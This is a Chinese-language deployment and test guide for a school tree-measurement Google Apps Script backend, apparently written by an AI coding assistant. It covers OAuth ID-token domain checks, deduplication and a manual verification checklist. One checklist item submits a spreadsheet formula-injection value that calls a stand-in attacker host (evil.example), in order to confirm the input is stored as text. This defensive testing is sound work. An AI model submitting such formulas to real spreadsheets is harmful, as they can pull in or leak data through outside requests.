# Apps Script 後端部署與驗證說明

> **此檔案的部署與驗證步驟需要您自己的 Google 帳號與校方 Google Workspace 網域執行,無法由 AI 代為完成。**
> 以下為給人類操作者的操作指南與檢查清單,AI 僅完成了 `Code.gs` 程式碼撰寫。

---

## Step 1:建立 Google Sheet 與分頁結構

1. 在您的 Google 帳號(校網域帳號)下,建立一份新試算表,命名為「校園樹木量測紀錄」。
2. 建立兩個分頁:

   **分頁一:「樹木主檔」**

   第一列(標題列):

   | 樹編號 | 樹種 | GPS座標 | 建立日期 |
   |---|---|---|---|

   **分頁二:「量測紀錄」**

   第一列(標題列):

   | 樹編號 | 量測時間戳 | 填寫人姓名 | 填寫人班級座號 | 仰角 | 水平距離 | 計算後樹高 | 樹圍 | 同步狀態 | 用戶端紀錄編號 |
   |---|---|---|---|---|---|---|---|---|---|

   注意:`Code.gs` 的 `doPost` 是依欄位順序 `appendRow`,務必確認分頁二標題列順序與上表一致,否則寫入的資料會對錯欄。

   **第 10 欄「用戶端紀錄編號」(`clientRecordId`)** 是前端為每筆量測產生的唯一值,`doPost` 在寫入前會先掃這一欄:若已存在同值就跳過寫入並直接回成功。這讓「雙擊送出」與「離線佇列重送」不會產生重複列。**這一欄必須存在且位置正確**(`Code.gs` 的 `COLUMN_CLIENT_RECORD_ID = 10`),否則去重會失效。此欄由程式自動填寫,人工不要編輯。

## Step 2:掛上 Apps Script 程式碼

1. 開啟上述試算表,選單「擴充功能 → Apps Script」。
2. 將本目錄下 `Code.gs` 的內容貼入編輯器(檔名建議也命名為 `Code.gs`)。
3. 確認 `ALLOWED_DOMAIN` 常數已依實際校網域調整(目前設定為 `nkhs.edu.tw`)。
4. 儲存專案。

## Step 3:建立 Google OAuth 用戶端 ID(登入用)

身分驗證改用 **Google Identity Services(GIS)登入 + ID Token 驗證**,與 Web App 的存取設定脫鉤。

1. 到 [Google Cloud Console](https://console.cloud.google.com/) 建立(或選用)一個專案。
2. 「API 和服務 → OAuth 同意畫面」:使用者類型選「內部」(限校方 Workspace 網域),填完必填欄位。
3. 「API 和服務 → 憑證 → 建立憑證 → OAuth 用戶端 ID」,應用程式類型選 **網頁應用程式**。
4. 「已授權的 JavaScript 來源」填入前端網站的來源(**只填 origin,不含路徑**),例如:
   `https://<user>.github.io`
5. 建立後複製 **用戶端 ID**,填入兩個地方(必須完全一致):
   - `public/tree.html` 的 `GOOGLE_CLIENT_ID`(取代 `PASTE_GOOGLE_OAUTH_CLIENT_ID_HERE`)
   - `apps-script/Code.gs` 的 `GOOGLE_CLIENT_ID`(同一個佔位字串)

**Google OAuth 用戶端 ID:** ___________________________________________ (由人類填入)

## Step 4:部署為 Web App

在 Apps Script 編輯器內:

1. 「部署 → 新增部署作業 → 選取類型:網頁應用程式」。
2. 設定(**與舊版不同,請照新設定**):
   - **執行身分(Execute as)**:「**我**」(指令碼擁有者)—— 不是「以存取應用程式的使用者身分」
   - **有權限存取的使用者(Who has access)**:「**任何人**」
3. 點擊部署,並在跳出的授權畫面完成 OAuth 授權(僅限您自己的帳號操作,AI 無法代為進行)。
4. 部署完成後記下產生的 **Web App URL**,填入 `public/tree.html` 的 `API_URL`。

**Web App URL:** ___________________________________________ (部署後由人類填入)

### 為什麼存取權限要開「任何人」

- 舊設定(執行身分=存取者、存取權限=僅限網域使用者)之下,**跨來源的 `fetch()` 根本到不了 `/exec`** —— Google 會回一個登入導向頁,瀏覽器的 CORS 規則也不允許帶著登入 cookie 跨站送出,結果是每一次線上送出都靜默失敗,看起來跟離線一模一樣。
- 新設計把網域關卡整個搬進 `Code.gs`:每個請求都必須帶 GIS 簽發的 ID Token,後端用 `https://oauth2.googleapis.com/tokeninfo` 驗證,並檢查
  `aud` == `GOOGLE_CLIENT_ID`、`hd` == `ALLOWED_DOMAIN`、未過期,三項全過才寫入。
- 因此「任何人皆可存取」只是讓請求打得到端點,**沒有帶合法校內帳號權杖的請求一樣會被拒絕**(回 `AUTH_REJECTED`)。

### 登入權杖過期(AUTH_EXPIRED)

Google ID Token 約 1 小時後過期。若學生離線超過一小時才恢復網路,佇列中那筆的權杖已失效:

- 後端回 `{status:'error', code:'AUTH_EXPIRED'}`。
- 前端**不會**丟掉這筆資料(資料本身仍有效),而是停止背景自動重送,並顯示提示要學生重新登入;重新登入後會自動補送。

## Step 5:手動驗證清單(TODO,部署後由人類逐項執行)

取得 ID Token 的方法:在已部署的量測頁面上用校內帳號登入後,開 devtools console 執行
`JSON.parse(localStorage.getItem('tree-map-id-token')).token`,複製出來當下面的 `<ID_TOKEN>`(約 1 小時後過期)。

- [ ] 帶**校網域帳號**的 ID Token 送出測試 POST,確認回應為 `{"status":"ok"}`,且「量測紀錄」分頁新增一列,「同步狀態」為「已同步」、第 10 欄有 `clientRecordId`
- [ ] **同一個 `clientRecordId` 再送一次**,確認回應為 `{"status":"ok","duplicate":true}`,且 Sheet **沒有**新增第二列(去重生效)
- [ ] 不帶 `idToken`(或隨便亂填)送出 POST,確認回應為 `{"status":"error","code":"AUTH_REJECTED",...}`,且 Sheet 沒有新增資料
- [ ] 用**非校網域**的 Google 帳號(個人 gmail)登入取得 token 後送出,確認同樣回 `AUTH_REJECTED`
- [ ] 把 `angleDeg` 改成 `95` 送出,確認回應為 `{"status":"error","code":"VALIDATION_FAILED",...}`,且 Sheet 沒有新增資料
- [ ] `studentName` 填 `=IMPORTXML("http://evil.example","//a")` 送出,確認 Sheet 儲存格顯示的是那串**文字**而不是執行公式
- [ ] 用超過一小時前取得的舊 token 送出,確認回應為 `{"status":"error","code":"AUTH_EXPIRED",...}`
- [ ] 對 Web App URL 加上 `?treeId=A-023&idToken=<ID_TOKEN>` 送出 GET,確認回傳 `{"status":"ok","records":[...]}` 且內容與 Sheet 中該樹編號的所有紀錄一致

### 測試 POST 範例(瀏覽器 devtools console)

```javascript
fetch('<Web App URL>', {
  method: 'POST',
  // 必須用簡單請求的 Content-Type,否則會觸發 Apps Script 無法回應的 CORS preflight
  headers: { 'Content-Type': 'text/plain;charset=utf-8' },
  body: JSON.stringify({
    treeId: 'A-023',
    timestamp: new Date().toISOString(),
    studentName: '王小明',
    studentClassNo: '301-12',
    angleDeg: 35,
    distanceM: 10,
    girthCm: 120,
    calculatedHeight: 7.0,
    clientRecordId: crypto.randomUUID(),
    idToken: '<ID_TOKEN>',
  }),
}).then((r) => r.json()).then(console.log);
```

### 測試 GET 範例

```javascript
fetch('<Web App URL>?treeId=A-023&idToken=<ID_TOKEN>').then((r) => r.json()).then(console.log);
```

---

## 與 `src/authDomain.js` 的關係

`Code.gs` 內的 `isAllowedDomain` 函式邏輯與 `src/authDomain.js` 的 `isAllowedDomain` 等價地重複維護 —
因 Apps Script 執行環境不支援 ES module 的 `import`/`export`,無法直接共用同一份程式碼。
若未來變更網域檢查邏輯,**兩處都要同步修改**,並考慮在 PR 描述中互相提醒。
